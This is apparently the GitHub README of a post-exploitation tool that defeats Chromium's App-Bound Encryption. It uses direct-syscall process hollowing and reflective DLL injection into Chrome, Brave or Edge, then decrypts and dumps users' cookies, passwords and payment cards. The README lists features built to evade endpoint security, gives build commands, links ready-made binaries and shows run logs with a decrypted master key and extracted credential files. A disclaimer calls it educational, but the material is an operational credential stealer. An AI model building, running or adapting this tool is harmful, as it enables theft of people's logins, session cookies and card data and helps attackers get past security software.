# Chrome App-Bound Encryption Decryption

## 🚀 Overview

![Build Status](https://img.shields.io/badge/build-passing-brightgreen)
![License](https://img.shields.io/badge/license-MIT-blue)
![Platform](https://img.shields.io/badge/platform-Windows%20x64%20%7C%20ARM64-lightgrey)
![Languages](https://img.shields.io/badge/code-C%2B%2B%20%7C%20ASM-9cf)

A post-exploitation tool demonstrating a complete, in-memory bypass of Chromium's **App-Bound Encryption (ABE)**. This project utilizes **Direct Syscall-based Reflective Process Hollowing** to launch a legitimate browser process in a suspended state, stealthily injecting a payload to hijack its identity and security context. This fileless approach allows the tool to operate entirely from memory, bypassing user-land API hooks to decrypt and exfiltrate sensitive user data (cookies, passwords, payments) from modern Chromium browsers.

If you find this research valuable, I’d appreciate a coffee:  
[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/M4M61EP5XL)

## 🔬 Technical Workflow

The tool's execution is focused on stealth and efficiency, built around a **Direct Syscall-based Reflective Hollowing** process. This approach ensures that few high-level API calls are made and that the payload operates from within a legitimate, newly created browser process.

### **Stage 1: The Injector (`chrome_inject.exe`)**

1.  **Pre-Flight & Initialization:** The injector begins by initializing its **direct syscall engine**, dynamically parsing `ntdll.dll` to resolve syscall numbers (SSNs) and locate kernel transition gadgets (`syscall/ret` or `svc/ret`). It then performs a critical pre-flight check, using `NtGetNextProcess` and other syscalls to find and terminate any browser "network service" child processes. This preemptively releases file locks on the target SQLite databases.
2.  **Payload Preparation:** The core payload DLL, which is stored as a **ChaCha20-encrypted resource**, is loaded and decrypted entirely in-memory.
3.  **Process Hollowing:** Instead of targeting an existing process, the injector creates a new instance of the target browser in a **`CREATE_SUSPENDED`** state (`CreateProcessW`). This pristine, suspended process serves as the host for our payload.
4.  **Reflective Injection via Syscalls:** Using the direct syscall engine, the injector performs a series of stealthy actions on the suspended process:
    *   It allocates memory using `NtAllocateVirtualMemory`.
    *   It writes the decrypted payload DLL into the allocated space with `NtWriteVirtualMemory`.
    *   It changes the memory region's permissions to executable using `NtProtectVirtualMemory`.
    *   It creates a **named pipe** for communication and writes the pipe's name into the target's memory.
5.  **Execution & Control:** A new thread is created in the target process using `NtCreateThreadEx`. The thread's start address points directly to the payload's `ReflectiveLoader` export, with the address of the remote pipe name as its argument. The original main thread of the browser remains suspended and is never resumed. The injector then waits for the payload to connect back to the pipe.

### **Stage 2: The Injected Payload (In-Memory)**

1.  **Bootstrapping:** The `ReflectiveLoader` stub executes, functioning as a custom in-memory PE loader. It correctly maps the DLL's sections, performs base relocations, and resolves its Import Address Table (IAT) by parsing the PEB and hashing function names. Finally, it invokes the payload's `DllMain`.
2.  **C2 Connection & Setup:** The `DllMain` spawns a new thread that immediately connects to the named pipe handle passed by the injector. It reads the configuration, including the output path, sent by the injector. All subsequent logs and status updates are relayed back through this pipe.
3.  **Target-Context COM Hijack:** Now running natively within the browser process, the payload instantiates the browser's internal `IOriginalBaseElevator` or `IEdgeElevatorFinal` COM server. As the call originates from a trusted process path, all of the server's security checks are passed.
4.  **Master Key Decryption:** The payload calls the `DecryptData` method on the COM interface, providing the `app_bound_encrypted_key` it reads from the `Local State` file. The COM server dutifully decrypts the key and returns the plaintext AES-256 master key to the payload.
5.  **Data Exfiltration:** Armed with the AES key, the payload enumerates all user profiles (`Default`, `Profile 1`, etc.). For each profile, it queries the relevant SQLite databases (`Cookies`, `Login Data`, `Web Data`), decrypts the data blobs using AES-256-GCM, and formats the secrets as JSON. The results are written directly to the output directory specified by the injector.
6.  **Shutdown:** After processing all profiles, the payload sends a completion signal to the injector over the pipe and calls `FreeLibraryAndExitThread` to clean up. The injector, upon receiving the signal, terminates the parent host process with `NtTerminateProcess`.

## 🛡️ Core Technical Pillars

This tool's effectiveness is rooted in a combination of modern, evasion-focused techniques:

*   **Direct Syscalls for Evasion:** Bypasses EDR/AV user-land hooks on standard WinAPI functions by invoking kernel functions directly. The engine is robust and dynamically resolves syscall numbers at runtime, ensuring compatibility across Windows versions.

*   **Direct Syscall-Based Process Hollowing:** A stealthy process creation and injection technique. Instead of injecting into a high-traffic, potentially monitored process, it creates a new, suspended host process. This significantly reduces the chances of detection, as all memory manipulations occur before the process begins normal execution.

*   **Fileless In-Memory Payload:** The payload DLL never touches the disk on the target machine. It is stored encrypted within the injector, decrypted in-memory, and reflectively loaded, minimizing its forensic footprint and bypassing static file-based scanners.

*   **Reflective DLL Injection (RDI):** A stealthy process injection method that circumvents `LoadLibrary`, thereby evading detection mechanisms that monitor module loads. The self-contained C loader resolves all of its own dependencies from memory.

*   **Target-Context COM Invocation:** The lynchpin for defeating App-Bound Encryption. By executing code *within* the trusted browser process, we inherit its identity and security context, allowing us to make legitimate-appearing calls to the ABE COM server and satisfy its path-validation security checks.

## ⚙️ Features

### Core Functionality
- 🔓 Full user-mode decryption of cookies, passwords, and payment methods.
- 📁 Discovers and processes all user profiles (Default, Profile 1, etc.).
- 📝 Exports all extracted data into structured JSON files, organized by profile.

### Stealth & Evasion
- 🛡️ **Fileless Payload Delivery:** In-memory decryption and injection of an encrypted resource.
- 🛡️ **Direct Syscall Engine:** Bypasses common endpoint defenses by avoiding hooked user-land APIs for all process operations.
- 🤫 **Process Hollowing:** Creates a benign, suspended host process for the payload, avoiding injection into potentially monitored processes.
- 👻 **Reflective DLL Injection:** Stealthily loads the payload without suspicious `LoadLibrary` calls.
- 🔒 **Proactive File-Lock Mitigation:** Automatically terminates browser utility processes that hold locks on target database files.
- 💼 **No Admin Privileges Required:** Operates entirely within the user's security context.

### Compatibility & Usability
- 🌐 Works on **Google Chrome**, **Brave**, & **Edge**.
- 💻 Natively supports **x64** and **ARM64** architectures.
- 🚀 **Standalone Operation:** Automatically creates a new browser process to host the payload, requiring no pre-existing running instances.
- 📁 Customizable output directory for extracted data.

<img width="1734" height="1552" alt="image" src="https://github.com/user-attachments/assets/3261aa3e-5875-4dcd-8a6f-dff93ec8aa25" />


## 📚 In-Depth Technical Analysis & Research

For a comprehensive understanding of Chrome's App-Bound Encryption, the intricacies of its implementation, the detailed mechanics of this tool's approach, and a broader discussion of related security vectors, please refer to my detailed research paper:

1.  ➡️ **[Chrome App-Bound Encryption (ABE) - Technical Deep Dive & Research Notes](docs/RESEARCH.md)**

    This document covers:
    * The evolution from DPAPI to ABE.
    * A step-by-step breakdown of the ABE mechanism, including `IElevator` COM interactions and key wrapping.
    * Detailed methodology of the DLL injection strategy used by this tool.
    * Analysis of encrypted data structures and relevant Chromium source code insights.
    * Discussion of alternative decryption vectors and Chrome's evolving defenses.

2.  ➡️ **[The Curious Case of the Cantankerous COM: Decrypting Microsoft Edge's App-Bound Encryption](docs/The_Curious_Case_of_the_Cantankerous_COM_Decrypting_Microsoft_Edge_ABE.md)**

    This article details the specific challenges and reverse engineering journey undertaken to achieve reliable ABE decryption for Microsoft Edge. It includes:
    *   An account of the initial issues and misleading error codes (`E_INVALIDARG`, `E_NOINTERFACE`).
    *   The process of using COM type library introspection (with Python `comtypes`) to uncover Edge's unique `IElevatorEdge` vtable structure and inheritance.
    *   How this insight led to tailored C++ interface stubs for successful interaction with Edge's ABE service.
    *   A practical look at debugging tricky COM interoperability issues.

3.  ➡️ **[COMrade ABE: Your Field Manual for App-Bound Encryption's COM Underbelly](docs/COMrade_ABE_Field_Manual.md)**

    This field manual introduces **COMrade ABE**, a Python-based dynamic analyzer for ABE COM interfaces, and dives into its practical applications:
    *   Explains the necessity for dynamic COM interface analysis due to browser variations and updates.
    *   Details COMrade ABE's methodology: registry scanning for service discovery, Type Library loading and parsing, and heuristic-based ABE method signature matching.
    *   Provides a comprehensive guide to interpreting COMrade ABE's output, including CLSIDs, IIDs (standard and C++ style), and the significance of verbose output details like VTable offsets, defining interfaces, and full inheritance chains.
    *   Highlights the utility of the auto-generated C++ stubs (`--output-cpp-stub`) for rapid development and research.
    *   Discusses how COMrade ABE aids in adapting to ABE changes, analyzing new Chromium browsers, and understanding vendor-specific COM customizations.

## 📦 Supported & Tested Versions

| Browser            | Tested Version (x64 & ARM64) |
| ------------------ | ---------------------------- |
| **Google Chrome**  | 138.0.7204.169               |
| **Brave**          | 1.80.124 (138.0.7204.168)    |
| **Microsoft Edge** | 139.0.3405.52                |

## 🔧 Build Instructions

This project uses a simple, robust build script that handles all compilation and resource embedding automatically.

1. **Clone** this repository.

2. Open a **Developer Command Prompt for VS** (or any MSVC‑enabled shell).

3. Run the build script from the project root:

   ```bash
    PS> make.bat
    --------------------------------------------------
    |          Chrome Injector Build Script          |
    --------------------------------------------------

    [INFO] Verifying build environment...
    [ OK ] Developer environment detected.
    [INFO] Target Architecture: arm64

    [INFO] Performing pre-build setup...
    [INFO]   - Creating fresh build directory: build
    [ OK ] Setup complete.

    -- [1/6] Compiling SQLite3 Library ------------------------------------------------
    [INFO]   - Compiling C object file...
    cl /nologo /W3 /O2 /MT /GS- /c libs\sqlite\sqlite3.c /Fo"build\sqlite3.obj"
    sqlite3.c
    [INFO]   - Creating static library...
    lib /NOLOGO /OUT:"build\sqlite3.lib" "build\sqlite3.obj"
    [ OK ] SQLite3 library built successfully.

    -- [2/6] Compiling Payload DLL (chrome_decrypt.dll) ------------------------------------------------
    [INFO]   - Compiling C file (reflective_loader.c)...
    cl /nologo /W3 /O2 /MT /GS- /c src\reflective_loader.c /Fo"build\reflective_loader.obj"
    reflective_loader.c
    [INFO]   - Compiling C++ file (chrome_decrypt.cpp)...
    cl /nologo /W3 /O2 /MT /GS- /EHsc /std:c++17 /Ilibs\sqlite /c src\chrome_decrypt.cpp /Fo"build\chrome_decrypt.obj"
    chrome_decrypt.cpp
    [INFO]   - Linking objects into DLL...
    link /NOLOGO /DLL /OUT:"build\chrome_decrypt.dll" "build\chrome_decrypt.obj" "build\reflective_loader.obj" "build\sqlite3.lib" bcrypt.lib ole32.lib oleaut32.lib shell32.lib version.lib comsuppw.lib /IMPLIB:"build\chrome_decrypt.lib"
      Creating library build\chrome_decrypt.lib and object build\chrome_decrypt.exp
    [ OK ] Payload DLL compiled successfully.

    -- [3/6] Compiling Encryption Utility (encryptor.exe) ------------------------------------------------
    [INFO]   - Compiling and linking...
    cl /nologo /W3 /O2 /MT /GS- /EHsc /std:c++17 /Ilibs\chacha src\encryptor.cpp /Fo"build\encryptor.obj" /link /NOLOGO /DYNAMICBASE /NXCOMPAT /OUT:"build\encryptor.exe"
    encryptor.cpp
    [ OK ] Encryptor utility compiled successfully.

    -- [4/6] Encrypting Payload DLL ------------------------------------------------
    [INFO]   - Running encryption process...
    build\encryptor.exe build\chrome_decrypt.dll build\chrome_decrypt.enc
    Successfully ChaCha20-encrypted build\chrome_decrypt.dll to build\chrome_decrypt.enc
    [ OK ] Payload encrypted to chrome_decrypt.enc.

    -- [5/6] Compiling Resource File ------------------------------------------------
    [INFO]   - Compiling .rc to .res...
    rc.exe /i "build" /fo "build\resource.res" src\resource.rc
    Microsoft (R) Windows (R) Resource Compiler Version 10.0.10011.16384
    Copyright (C) Microsoft Corporation.  All rights reserved.

    [ OK ] Resource file compiled successfully.

    -- [6/6] Compiling Final Injector (chrome_inject.exe) ------------------------------------------------
    [INFO]   - Assembling syscall trampoline (arm64)...
    armasm64.exe -nologo "src\syscall_trampoline_arm64.asm" -o "build\syscall_trampoline_arm64.obj"
    [INFO]   - Compiling C++ source (chrome_inject.cpp)...
    cl /nologo /W3 /O2 /MT /GS- /EHsc /std:c++17 /Ilibs\chacha /c src\chrome_inject.cpp /Fo"build\chrome_inject.obj"
    chrome_inject.cpp
    [INFO]   - Compiling C++ source (syscalls.cpp)...
    cl /nologo /W3 /O2 /MT /GS- /EHsc /std:c++17 /c src\syscalls.cpp /Fo"build\syscalls.obj"
    syscalls.cpp
    [INFO]   - Linking final executable...
    cl /nologo /W3 /O2 /MT /GS- /EHsc /std:c++17 "build\chrome_inject.obj" "build\syscalls.obj" build\syscall_trampoline_arm64.obj "build\resource.res" version.lib shell32.lib /link /NOLOGO /DYNAMICBASE /NXCOMPAT /OUT:".\chrome_inject.exe"
    [ OK ] Final injector built successfully.

    --------------------------------------------------
    |                 BUILD SUCCESSFUL               |
    --------------------------------------------------

      Final Executable: .\chrome_inject.exe

    [INFO] Build successful. Final artifacts are ready.
   ```

This single command will compile all components and produce a self-contained `chrome_inject.exe` in the root directory.

###  Automated Builds with GitHub Actions

This project uses GitHub Actions to automatically build the injector executable ( `chrome_inject.exe`) for both **x64** and **ARM64** architectures

You can find the latest pre-compiled binaries on the [**Releases page**](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases). The executables for both architectures are packaged together in a single, convenient .zip file.

**Release Package Contents:**
- `chrome_inject_x64.exe`
- `chrome_inject_arm64.exe`

## 🚀 Usage

```bash
Usage: chrome_inject.exe [options] <chrome|brave|edge>
```

### Options

Options

- `--output-path <path>` or `-o <path>`
  Specifies the base directory for output files.
  Defaults to `.\output\` relative to the injector's location.
  Data will be organized into subfolders: `<path>/<BrowserName>/<ProfileName>/`.

- `--verbose` or `-v`
  Enable extensive debugging output from the injector.

- `--help` or `-h`
  Show this help message.

### Examples

```bash
# Standard injection into a running Chrome process:
PS> .\chrome_inject.exe chrome

# Auto-start Brave and show verbose debug logs:
PS> .\chrome_inject.exe --start-browser --verbose brave
```

#### Normal Run

```bash
PS> .\chrome_inject.exe --start-browser chrome
------------------------------------------------
|  Chrome App-Bound Encryption Decryption      |
|  Direct Syscall-Based Reflective Hollowing   |
|  x64 & ARM64 | v0.14.0 by @xaitax            |
------------------------------------------------

[*] Scanning for and terminating browser network services...
[+] Found and terminated network service PID: 23660
[*] Termination sweep complete. Waiting for file locks to fully release.
[*] Creating suspended Chrome process.
[+] Created suspended process PID: 17196
[+] New thread created for payload. Main thread remains suspended.
[*] Waiting for payload execution. (Pipe: \\.\pipe\60f1f20f-f6a7-41a9-ae23-ed0a9da6ded5)

[*] Decryption process started for Chrome
[+] COM library initialized (APARTMENTTHREADED).
[*] Reading Local State file: C:\Users\ah\AppData\Local\Google\Chrome\User Data\Local State
[*] Attempting to decrypt master key via Chrome's COM server...
[+] Decrypted AES Key: 3fa14dc988a34c85bdb872159b739634cb7e56f8e34449c1494297b9b629d094
[*] Discovering browser profiles in: C:\Users\ah\AppData\Local\Google\Chrome\User Data
[+] Found 2 profile(s).
[*] Processing profile: Default
     [*] 375 cookies extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Default\cookies.json
     [*] 1 passwords extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Default\passwords.json
[*] Processing profile: Profile 1
     [*] 111 cookies extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Profile 1\cookies.json
     [*] 1 passwords extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Profile 1\passwords.json
[*] All profiles processed. Decryption process finished.

[+] Payload signaled completion or pipe interaction ended.
[*] Chrome terminated by injector.
```

#### Verbose

```bash
PS> .\chrome_inject.exe --verbose chrome
------------------------------------------------
|  Chrome App-Bound Encryption Decryption      |
|  Direct Syscall-Based Reflective Hollowing   |
|  x64 & ARM64 | v0.14.0 by @xaitax            |
------------------------------------------------

[#] [Syscalls] Found and sorted 489 Zw* functions.
[#] [Syscalls] Successfully initialized all direct syscall stubs.
[#] [Syscalls]   - AllocateVirtualMemory (SSN: 24) -> Gadget: 0x7fff58951190
[#] [Syscalls]   - CreateThreadEx (SSN: 201) -> Gadget: 0x7fff58951cd0
[#] [Syscalls]   - FlushInstructionCache (SSN: 241) -> Gadget: 0x7fff58951f50
[#] [Syscalls]   - FreeVirtualMemory (SSN: 30) -> Gadget: 0x7fff589511f0
[#] [Syscalls]   - GetContextThread (SSN: 251) -> Gadget: 0x7fff58951ff0
[#] [Syscalls]   - GetNextProcess (SSN: 256) -> Gadget: 0x7fff58952040
[#] [Syscalls]   - OpenProcess (SSN: 38) -> Gadget: 0x7fff58951280
[#] [Syscalls]   - ProtectVirtualMemory (SSN: 80) -> Gadget: 0x7fff58951540
[#] [Syscalls]   - QueryInformationProcess (SSN: 25) -> Gadget: 0x7fff589511a0
[#] [Syscalls]   - ReadVirtualMemory (SSN: 63) -> Gadget: 0x7fff58951430
[#] [Syscalls]   - ResumeThread (SSN: 82) -> Gadget: 0x7fff58951560
[#] [Syscalls]   - SetContextThread (SSN: 410) -> Gadget: 0x7fff589529e0
[#] [Syscalls]   - TerminateProcess (SSN: 44) -> Gadget: 0x7fff58951300
[#] [Syscalls]   - UnmapViewOfSection (SSN: 42) -> Gadget: 0x7fff589512d0
[#] [Syscalls]   - WriteVirtualMemory (SSN: 58) -> Gadget: 0x7fff589513e0
[*] Scanning for and terminating browser network services...
[+] Found and terminated network service PID: 22652
[*] Termination sweep complete. Waiting for file locks to fully release.
[*] Creating suspended Chrome process.
[#] Target executable path: C:\Program Files\Google\Chrome\Application\chrome.exe
[+] Created suspended process PID: 23924
[#] Architecture match: Injector=ARM64, Target=ARM64
[#] Named pipe server created: \\.\pipe\f57cd2b6-1d97-4e3b-a4f1-72f94715cd5a
[#] Loading and decrypting payload DLL.
[#] Parsing payload PE headers for ReflectiveLoader.
[#] ReflectiveLoader found at file offset: 0x13fb8
[#] Allocating memory for payload in target process.
[#] Payload memory allocated at: 0x247e4170000
[#] Writing payload to target process.
[#] Changing payload memory protection to executable.
[#] Passing pipe name parameter to target.
[#] Creating new thread in target to execute ReflectiveLoader.
[#] Successfully created new thread for payload.
[+] New thread created for payload. Main thread remains suspended.
[#] Waiting for payload to connect to named pipe.
[#] Payload connected to named pipe.
[#] Sent message to pipe: VERBOSE_TRUE
[#] Sent message to pipe: C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output
[*] Waiting for payload execution. (Pipe: \\.\pipe\f57cd2b6-1d97-4e3b-a4f1-72f94715cd5a)

[*] Decryption process started for Chrome
[+] COM library initialized (APARTMENTTHREADED).
[*] Reading Local State file: C:\Users\ah\AppData\Local\Google\Chrome\User Data\Local State
[*] Attempting to decrypt master key via Chrome's COM server...
[+] Decrypted AES Key: 3fa14dc988a34c85bdb872159b739634cb7e56f8e34449c1494297b9b629d094
[*] Discovering browser profiles in: C:\Users\ah\AppData\Local\Google\Chrome\User Data
[+] Found 2 profile(s).
[*] Processing profile: Default
     [*] 375 cookies extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Default\cookies.json
     [*] 1 passwords extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Default\passwords.json
[*] Processing profile: Profile 1
     [*] 111 cookies extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Profile 1\cookies.json
     [*] 1 passwords extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Profile 1\passwords.json
[*] All profiles processed. Decryption process finished.
[#] Payload completion signal received.

[+] Payload signaled completion or pipe interaction ended.
[#] Terminating browser PID=23924 via direct syscall.
[*] Chrome terminated by injector.
[#] Injector finished successfully.
```

## 📂 Data Extraction

Once decryption completes, data is saved to the specified output path (defaulting to `.\output\` if not specified via `--output-path`). Files are organized as follows:

**Base Path:** `YOUR_CHOSEN_PATH` (e.g., `.\output\` or the path you provide)
**Structure:** <Base Path>/<BrowserName>/<ProfileName>/<data_type>.txt

Example paths (assuming default output location):**

- 🍪 **Cookies (Chrome Default profile):** .\output\Chrome\Default\cookies.txt
- 🔑 **Passwords (Edge Profile 1):** .\output\Edge\Profile 1\passwords.txt
- 💳 **Payment Methods (Brave Default profile):** .\output\Brave\Default\payments.txt

### 🍪 Cookie Extraction

Each cookie file is a JSON array of objects:

```json
[
  {
    "host": "accounts.google.com",
    "name": "ACCOUNT_CHOOSER",
    "value": "AFx_qI781-…"
  },
  {
    "host": "mail.google.com",
    "name": "OSID",
    "value": "g.a000uwj5ufIS…"
  },
  …
]
```

### 🔑 Password Extraction

Each password file is a JSON array of objects:

```json
[
  {
    "origin": "https://example.com/login",
    "username": "user@example.com",
    "password": "••••••••••"
  },
  {
    "origin": "https://another.example.com",
    "username": "another_user",
    "password": "••••••••••"
  }
  …
]
```

### 💳 Payment Method Extraction

Each payment file is a JSON array of objects:

```json
[
  {
    "name_on_card": "John Doe",
    "expiration_month": 12,
    "expiration_year": 2030,
    "card_number": "••••••••••1234",
    "cvc": "•••"
  },
  {
    "name_on_card": "Jane Smith",
    "expiration_month": 07,
    "expiration_year": 2028,
    "card_number": "••••••••••5678",
    "cvc": "•••"
  }
  …
]
```

## 🔗 Additional Resources & Research

This project builds upon the work and analysis of the wider security community.

- **Official Documentation & Announcements:**
  - [Google Security Blog: Improving the security of Chrome cookies on Windows](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
  - [Design Doc: Chrome app-bound encryption Service](https://drive.google.com/file/d/1xMXmA0UJifXoTHjHWtVir2rb94OsxXAI/view)

- **Community Research & Acknowledgment:**
  - Proof of concept by [snovvcrash](https://gist.github.com/snovvcrash/caded55a318bbefcb6cc9ee30e82f824)

## 🗒️ Changelog

All notable changes to this project are documented in the [**CHANGELOG**](CHANGELOG.md) file. This includes version history, new features, bug fixes, and security improvements.

## 📜 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## 💡 Project Philosophy & Disclaimer

> [!IMPORTANT]
> This is a hobby project created for educational and security research purposes. It serves as a personal learning experience and a playing field for exploring advanced Windows concepts.
>
> **This tool is NOT intended to be a fully-featured infostealer or a guaranteed EDR evasion tool.** While it employs advanced techniques, its primary goal is to demonstrate and dissect the ABE mechanism, not to provide operational stealth for malicious use. Please ensure compliance with all relevant legal and ethical guidelines.
